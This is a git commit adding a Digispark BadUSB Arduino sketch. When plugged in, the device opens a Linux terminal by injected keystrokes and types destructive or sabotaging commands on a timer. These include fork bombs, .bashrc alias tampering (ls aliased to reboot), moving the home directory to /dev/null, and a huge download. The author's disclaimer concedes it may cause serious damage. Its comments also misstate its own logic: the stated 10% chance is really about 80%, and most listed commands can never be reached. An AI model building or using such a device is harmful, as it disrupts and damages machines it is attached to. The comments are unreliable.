a9feb1c2a093042e1d517148b86f019854d05016
galimba <github@galimba.com.ar>
2018-05-30 01:56:12 -0300

    Create badThingsHappen.ino
    This is a proof of concept. Imagine I have a bad habit of not logging out of my VM, then I attach this code to a BadUSB to punish myself every time I don't close my sessions

---
+++ badThingsHappen.ino
@@ -0,0 +1,104 @@
+//Digispark attiny85 code for generating a usb key
+// that automatically messes with your linux system
+//                    VERY ANNOYING!
+// 2018 Personal project, trying some arduino stuff
+// published under GPL v3.0
+// Galimba
+
+// DISCLAIMER:
+// This is just for educational purposes.
+// I'm using this just to mess around on a disposable VM.
+// Be responsible, don't be a jerk to others!
+// This code may cause serious damage to a system.
+
+#include "DigiKeyboard.h"
+
+void setup()
+{
+  // keyboard ini stuff
+  delay(1500); //giving the host a sec to load up the keyboard driver, just in case :-)
+  pinMode(1,OUTPUT); // Onboard LED
+  flash(100);
+  DigiKeyboard.sendKeyStroke(0); // official github says this should be here
+}
+
+void loop()
+{ //Main loop
+  int rnum= random(100);
+  if(rnum > 20)
+  {// aprox. 10% chance of doing something bad
+    openTerm(); //opens up a terminal
+    runCmd(randBadThing(rnum)); //executes random nasty command
+  }
+  else
+  {// most of the time, we'll be the good guy and just lock the screen
+    lockScreen();
+  }
+  delay(28800000); // every 8 hours
+}
+
+void openTerm()
+{ //Ubuntu key shortcut to open a new terminal
+  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT|MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(700);
+}
+
+void runCmd(char *txt)
+{ //this will just print a command and hit enter
+  DigiKeyboard.println(txt);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void flash(int ms)
+{ //this will flash the onboard led every ms milliseconds
+  digitalWrite(1,HIGH);
+  delay(ms);
+  digitalWrite(1,LOW);
+}
+
+void lockScreen()
+{
+   DigiKeyboard.sendKeyStroke(KEY_L,MOD_ALT_LEFT|MOD_CONTROL_LEFT);
+}
+
+char* randBadThing(int n)
+{
+  switch(n)
+  {
+    case 1:// plain and simple annoying
+      return "echo \"alias cd='ls'\" >> .bashrc";
+      break;
+    case 2:// you can blame Jaromil for this fork bomb =)
+      return ":(){ :|:& };:";
+      break;
+    case 3:// offensive alias
+      return "echo \"alias vim='cat'\" >> .bashrc";
+      break;
+    case 4:// this will download a 1tb file
+      return "wget http://speedtest.tele2.net/1000GB.zip";
+      break;
+    case 5:// this is fucked up
+      return "cd && mv . /dev/null";
+      break;
+    case 6:// naive
+      return "yes [You've been pwnd]";
+      break;
+    case 7:// let's watch starwars over telnet
+      return "telnet towel.blinkenlights.nl";
+      break;
+    case 8:// cool way to mess around with the cli
+      return "export PROMPT_COMMAND=\"cd\"";
+      break;
+    case 9:// lol
+      return "echo \"alias kill='echo all dead'\" >> .bashrc";
+      break;
+    case 0:// this won't work without root, but... 
+      return "echo \"alias ls='shutdown -r now'\" >> .bashrc";
+      break;
+    case 10:// another fork bomb, if perl is available
+      return "perl -e fork while fork";
+      break;
+    default:// lucky you =) Next time, don't leave your terminal unlocked!
+      return "wall \"I'm a lucky bastard!\"";
+  }
+}
